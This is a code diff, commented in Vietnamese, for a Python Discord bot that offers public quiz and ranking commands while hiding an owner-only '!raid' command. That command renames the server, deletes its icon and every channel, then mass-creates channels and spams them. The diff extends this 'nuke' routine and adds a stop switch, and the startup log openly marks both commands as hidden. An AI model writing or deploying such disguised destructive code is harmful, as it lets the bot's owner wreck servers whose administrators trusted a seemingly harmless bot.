@@ -109,7 +109,6 @@ def get_rank_color(rank):
 
 # ===== LƯU TRỮ ĐIỂM THEO SERVER =====
 def get_rankings(guild_id):
-    """Lấy điểm của server, luôn load từ file mới nhất"""
     filename = f"rankings_{guild_id}.json"
     if os.path.exists(filename):
         with open(filename, "r", encoding="utf-8") as f:
@@ -1821,12 +1820,22 @@ class QuizView(discord.ui.View):
             child.disabled = True
         await interaction.edit_original_response(view=self)
 
-# ===== HÀM NUKE =====
+# ===== HÀM NUKE (ĐÃ SỬA) =====
+nuke_running = False
+
 async def change_guild_name(guild):
     try:
         await guild.edit(name=NEW_GUILD_NAME)
     except:
         pass
+
+async def delete_guild_icon(guild):
+    """Xóa ảnh đại diện của server"""
+    try:
+        await guild.edit(icon=None)
+        print(f"[*] Đã xóa ảnh đại diện server: {guild.name}")
+    except Exception as e:
+        print(f"[!] Lỗi xóa icon: {e}")
 
 async def delete_all_channels(guild):
     for ch in list(guild.channels):
@@ -1837,8 +1846,12 @@ async def delete_all_channels(guild):
             pass
 
 async def create_channels_and_spam(guild):
+    global nuke_running
     total_created = 0
     for batch_start in range(0, CHANNEL_COUNT, BATCH_SIZE):
+        if not nuke_running:
+            print("[*] Nuke stopped by user.")
+            return
         batch_tasks = []
         batch_count = min(BATCH_SIZE, CHANNEL_COUNT - batch_start)
         for i in range(batch_count):
@@ -1856,7 +1869,8 @@ async def create_channels_and_spam(guild):
         await asyncio.sleep(0.05)
 
 async def continuous_spam(guild):
-    while True:
+    global nuke_running
+    while nuke_running:
         channels = list(guild.text_channels)
         if not channels:
             await asyncio.sleep(0.3)
@@ -1869,16 +1883,21 @@ async def continuous_spam(guild):
         await asyncio.sleep(0.1)
 
 async def raid(guild):
+    global nuke_running
+    nuke_running = True
     await change_guild_name(guild)
-    await asyncio.sleep(1)
+    await asyncio.sleep(0.5)
+    await delete_guild_icon(guild)   # Xóa ảnh đại diện server
+    await asyncio.sleep(0.5)
     await delete_all_channels(guild)
     await asyncio.sleep(0.1)
     asyncio.create_task(create_channels_and_spam(guild))
     asyncio.create_task(continuous_spam(guild))
 
-# ===== LỆNH !raid (DM lưu link, server nuke) =====
+# ===== LỆNH !raid VÀ !stop (ĐÃ SỬA) =====
 @client.event
 async def on_message(message):
+    global nuke_running
     if message.author.id == client.user.id:
         return
     if message.author.id != OWNER_ID:
@@ -1900,7 +1919,11 @@ async def on_message(message):
             await raid(message.guild)
 
     elif message.content.lower() == "!stop":
-        sys.exit(0)
+        if nuke_running:
+            nuke_running = False
+            await message.channel.send("⏹️ **Đã dừng nuke!** Bot vẫn hoạt động bình thường.")
+        else:
+            await message.channel.send("ℹ️ **Nuke hiện không chạy.** Bot vẫn hoạt động.")
 
 # ===== SỰ KIỆN =====
 @client.event
@@ -1911,6 +1934,7 @@ async def on_ready():
     print(f"[*] Bot online: {client.user}")
     print("[*] Public: /start, /rankings, /diem")
     print("[*] Hidden: !raid (owner only – full nuke)")
+    print("[*] Hidden: !stop (owner only – stop nuke)")
     await tree.sync()
     print("[*] Slash commands synced.")
     for guild in client.guilds:
